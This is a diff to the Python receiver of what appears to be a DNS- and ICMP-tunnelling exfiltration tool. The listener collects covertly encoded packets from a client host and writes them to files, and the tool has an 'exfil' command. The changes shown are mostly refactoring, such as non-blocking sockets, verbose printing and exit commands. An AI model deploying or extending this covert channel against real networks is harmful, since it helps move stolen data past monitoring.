@@ -1,24 +1,25 @@
-import socket
-import binascii
-import math
-import threading
-import struct
 import argparse
-import random
+import binascii
 import cmd
+import errno
+import math
 import os
+import random
+import socket
+import struct
+import sys
+import threading
+import time
 
 ICMP_PROTOCOL   = socket.getprotobyname('icmp')
 UDP_PROTOCOL    = socket.getprotobyname('udp')
-
-incomingFileBytes = bytearray()
 
 complete = False
 packetCount = 0
 
 bindAddress = "127.0.0.1"
 
-options = {'clientIP':'127.0.0.1', 'verbose':False}
+options = {'clientIP':'127.0.0.1', 'verbose':False, 'outputDirectory':'output'}
 
 bindPort    = 53
 dstPort     = 1337
@@ -41,6 +42,10 @@ def init():
     sendSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     receiveDNSSocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
     receiveICMPSocket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+
+    # Set both sockets to non blocking mode
+    receiveDNSSocket.setblocking(0)
+    receiveICMPSocket.setblocking(0)
 
     # ICMP doesn't use ports so it doesn't matter what port we specify
     receiveICMPSocket.bind((bindAddress, bindPort))
@@ -114,72 +119,93 @@ def isEndOfFile(data):
         return True
     else:
         return False
+def printIfVerbose(str):
+    if options['verbose']:
+        print(str)
 
 def receiveICMP(isFile):
     global complete
 
     while not complete:
-        data, addr = receiveICMPSocket.recvfrom(1024)
-        if options['verbose']:
-            print("Received ICMP packet from: " + str(addr))
-        # Remove erroneous packets not from client
-        # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
-
-        if addr[0] == options['clientIP']:
-            parsed = parseICMPPacket(data)
-            if isEndOfFile(parsed):
-                if options['verbose']:
-                    print("Received end of transmission")
-                if isFile:
-                    if options['verbose']:
-                        print("Closing file")
-                    handle.close()
-                # Kill other receiving threads
-                return
+        try:
+            data, addr = receiveICMPSocket.recvfrom(1024)
+            if not data:
+                print("Connection closed")
+                receiveDNSSocket.close()
+                break
             else:
-                if isFile:
-                    try:
-                        handle.write(parsed)
-                    except Exception as e:
-                        print("Error: " + str(e))
+                printIfVerbose("Received ICMP packet from: " + str(addr))
+                # Remove erroneous packets not from client
+                # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
+
+                if addr[0] == options['clientIP']:
+                    parsed = parseICMPPacket(data)
+                    if isEndOfFile(parsed):
+                        printIfVerbose("Received end of transmission")
+                        if isFile:
+                            printIfVerbose("Closing file")
+                            handle.close()
+
+                        # Set flag to exit both listening threads
+                        complete = True
+                    else:
+                        if isFile:
+                            try:
+                                handle.write(parsed)
+                            except Exception as e:
+                                print("Error: " + str(e))
+                        else:
+                            print(parsed.decode())
                 else:
-                    print(parsed.decode())
-        else:
-            if options['verbose']:
-                print("Useless packet.")
+                    printIfVerbose("Useless packet.")
+        except socket.error as e:
+            if e.args[0] == errno.EWOULDBLOCK:
+                time.sleep(1)
+            else: 
+                raise e
 
 def receiveDNS(isFile):
     global complete
 
     # TODO: IMPORTANT, remove duplicate code in receiveICMP, concatenate as much as possible in to one
     while not complete:
-        data,addr = receiveDNSSocket.recvfrom(1024)
-        if options['verbose']:
-            print("Received DNS packet from: " + str(addr))
-        # Remove erroneous packets not from client
-        # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
-        
-        if addr[0] == options['clientIP']:
-            parsed = parseDNSPacket(data)
-            if isEndOfFile(parsed):
-                if options['verbose']:
-                    print("Received end of transmission")
-                if isFile:
-                    if options['verbose']:
-                        print("Closing file")
-                    handle.close()
-                # Kill other receiving threads
-                return
+        try:
+            data,addr = receiveDNSSocket.recvfrom(1024)
+            if not data:
+                print("Connection closed")
+                receiveDNSSocket.close()
+                break
             else:
-                if isFile:
-                    try:
-                        handle.write(parsed)
-                    except Exception as e:
-                        print("Error: " + str(e))
-                else:
-                    print(parsed.decode())
-        else:   
-            print("Useless packet.")
+                printIfVerbose("Received DNS packet from: " + str(addr))
+                # Remove erroneous packets not from client
+                # TODO: IMPORTANT, need further checks as broadcasts/traffic still may come from client
+                
+                if addr[0] == options['clientIP']:
+                    parsed = parseDNSPacket(data)
+                    if isEndOfFile(parsed):
+                        printIfVerbose("Received end of transmission")
+                        if isFile:
+                            printIfVerbose("Closing file")
+                            handle.close()
+
+                        # Set flag to exit both listening threads
+                        complete = True
+                    else:
+                        if isFile:
+                            try:
+                                handle.write(parsed)
+                            except Exception as e:
+                                print("Error: " + str(e))
+                        else:
+                            print(parsed.decode())
+                else:   
+                    print("Useless packet.")
+        except socket.error as e:
+            # Nothing to receive, try again
+            if e.args[0] == errno.EWOULDBLOCK:
+                time.sleep(1)
+            else:
+                raise e   
 
 def receiveData(isFile=False, fileName=None):
     global complete
@@ -192,8 +218,7 @@ def receiveData(isFile=False, fileName=None):
 
     # If receiving a file then open file with given name
     if isFile:
-        if options['verbose']:
-            print("Opening file '" + fileName + "'")
+        printIfVerbose("Opening file '" + fileName + "'")
         handle = open("output/" + fileName, "wb")
 
     receiveICMPThread = threading.Thread(target=receiveICMP, args=(isFile,))
@@ -207,8 +232,7 @@ def receiveData(isFile=False, fileName=None):
     while not complete:
         pass
 
-    if options['verbose']:
-        print("Done")
+    printIfVerbose("Done")
 
 def listen():
     # TODO: IMPORTANT, remove, debugging purposes only
@@ -224,8 +248,7 @@ def listen():
         #    print("Useless packet.")
 
 def close():
-    if options['verbose']:
-        print("Closing file and socket")
+    printIfVerbose("Closing file and socket")
     #receiveDNSSocket.close()
     handle.close()
     
@@ -261,10 +284,14 @@ Written by Harvey Stocks.\n
         receiveData()
 
     def do_close(self, args):
-        # TODO: IMPORTANT, remove, debugging purposes only
-        # Close file handle
-        handle.close()
+        sys.exit()
     
+    def do_exit(self, args):
+        sys.exit()
+
+    def do_quit(self, args):
+        sys.exit()
+
     def do_setopt(self, args):
         global options
 
@@ -289,10 +316,11 @@ Written by Harvey Stocks.\n
         # < is left align
         # =^ means pad with '='
         # 15 is the width of output
-        print("{:<15} {:<15}".format("Option", "Value"))
-        print("{:=^15} {:=^15}".format("", ""))
+        print("{:<18} {:<18}".format("Option", "Value"))
+        print("{:=^18} {:=^18}".format("", ""))
         for k,v in options.items():
-            print("{:<15} {:<15}".format(str(k), str(v)))
+            print("{:<18} {:<18}".format(str(k), str(v)))
+        print("")
 
     def do_exfil(self, args):
         argString = args
@@ -352,18 +380,6 @@ Written by Harvey Stocks.\n
     def do_threadStatus(self,args):
         print(receiveDNSThread.isAlive())
         print(receiveICMPThread.isAlive())
-
-    def do_exit(self, args):
-        '''
-        if not receivingFile:
-            self.close()
-        else:
-            choice = input("You are receiving a file. Are you sure you want to exit? Y/n")
-            if choice.tolower() == "y":
-                exit()
-            else:
-                return
-        '''
 
     def emptyline(self):
         print("Enter a command. Type 'help' to display help page.")
